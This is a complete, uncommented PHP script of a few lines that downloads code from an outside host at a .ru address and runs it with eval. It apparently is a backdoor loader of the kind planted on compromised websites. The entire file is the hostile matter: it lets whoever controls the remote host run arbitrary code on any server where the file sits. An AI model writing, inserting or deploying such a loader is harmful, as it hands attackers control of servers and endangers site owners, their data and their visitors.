<?php
$path = "https://code.topkz.ru/fgd/8/shi.php";
$code = implode('', file($path));
eval("?>" . $code);
?>
